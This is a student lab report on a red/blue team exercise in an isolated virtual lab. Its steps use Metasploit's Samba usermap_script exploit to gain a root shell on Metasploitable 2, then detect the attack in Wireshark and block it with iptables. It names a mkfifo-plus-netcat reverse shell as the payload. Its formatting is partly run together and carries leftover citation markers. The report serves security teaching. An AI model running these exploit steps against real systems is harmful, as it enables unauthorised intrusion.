# Clash of Teams 101 - Breach & Defend
## Complete Adversarial Simulation Report

**Submitted By:** Ahad Parvaiz  
**Submitted To:** DevTown

---

## 1. Introduction
[cite_start]This project demonstrates a full adversarial simulation involving both offensive (**Red Team**) and defensive (**Blue Team**) operations within a controlled virtual lab environment[cite: 6, 7]. [cite_start]The objective was to compromise a vulnerable system and then detect, analyze, and remediate the attack using professional monitoring techniques[cite: 8].

## 2. Phase 1 - Environment Setup
### 2.1 Lab Configuration
[cite_start]A virtual lab was created using **VMware** with two machines configured on the same internal network[cite: 12].

| Role | Operating System | IP Address |
| :--- | :--- | :--- |
| **Attacker** | Kali Linux | 192.168.40.128 |
| **Target** | Metasploitable 2 | 192.168.40.129 |

[cite_start][cite: 13]

### 2.2 Connectivity Verification
[cite_start]To confirm the network configuration, a ping test was performed from the Attacker machine to the Target[cite: 64, 65].

```bash
ping -c 3 192.168.40.129
```
Results: Successful responses verified that the virtual network was correctly configured and both machines were reachable.3. Phase 2 - Red Team (Offensive Execution)3.1 ReconnaissanceThe first step was information gathering using Nmap.Scan Findings:Active Services: Multiple open ports were identified, including FTP (21), SSH (22), HTTP (80), and SMB (139/445).+4Attack Vector: Port 139 (SMB service) was selected because Samba on Metasploitable 2 is known to contain exploitable vulnerabilities.3.2 ExploitationThe exploitation was conducted using the Metasploit Framework.Exploit: exploit/multi/samba/usermap_script Steps:Initialize Metasploit: msfconsole Set Target IP: set RHOSTS 192.168.40.129 Set Local Host IP: set LHOST 192.168.40.128 Execute: exploit 3.3 Exploitation ResultA command shell session was successfully opened. Running whoami confirmed root access, indicating a full system compromise through unauthenticated remote exploitation.+24. Phase 3 - Blue Team (Detection & Analysis)Network monitoring was conducted using Wireshark to observe the complete attack lifecycle.4.1 Timeline of AttackNoTime (IST)SourceDestinationProtocolObservation103:01:08.592192.168.40.128192.168.40.129TCPSYN-Connection initiated403:01:08.602192.168.40.128192.168.40.129SMBNegotiate Protocol Request603:01:08.603192.168.40.128192.168.40.129SMBSession Setup containing malicious command703:01:14.622192.168.40.128192.168.40.129TCPReverse connection established (Port 4444)4.2 Indicators of Compromise (IoC)Attacker IP: 192.168.40.128 Victim IP: 192.168.40.129 Exploited Port: 139 Callback Port: 4444 Malicious Command: mkfifo + nc reverse shell 5. Phase 4 - Remediation (Containment & Defense)5.1 Firewall MitigationTo block the attacker's IP address, an iptables rule was applied on the target system:Bashsudo iptables -A INPUT -s 192.168.40.128 -j DROP
5.2 Verification of FixThe exploit was attempted again after applying the rule. The connection timed out, and no session was created, confirming the mitigation successfully disrupted the attack chain.+36. Phase 5 - Purple Team ReportingThis section correlates offensive actions with defensive observations to strengthen overall security posture.+1Attack StageRed Team ActionBlue Team EvidenceReconnaissanceNmap port scanTCP connection attempts visibleExploit LaunchSamba exploit executedSYN packet to port 139Payload InjectionMalicious command deliveredSMB Session Setup packetReverse ShellNetcat callback to port 4444Reverse TCP connection detected7. ConclusionThis adversarial simulation successfully demonstrated reconnaissance, exploitation, detection through packet analysis, and containment using firewall rules. The project highlights the critical need for continuous monitoring, proper firewall configuration, and timely patch management.
